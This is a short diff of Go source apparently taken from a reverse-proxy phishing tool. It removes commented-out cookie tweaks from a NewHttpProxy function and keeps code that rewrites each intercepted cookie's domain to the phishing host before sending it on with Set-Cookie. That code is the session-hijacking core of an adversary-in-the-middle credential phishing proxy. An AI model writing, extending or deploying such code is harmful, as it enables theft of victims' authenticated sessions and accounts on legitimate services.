@@ -699,12 +699,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				//ck.Secure = false
-				//ck.MaxAge = 0
-				//if time.Now().Before(ck.Expires) {
-				//	ck.Expires, _ = time.Parse("1600-01-01", "1600-01-01")
-				//}
-
 				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
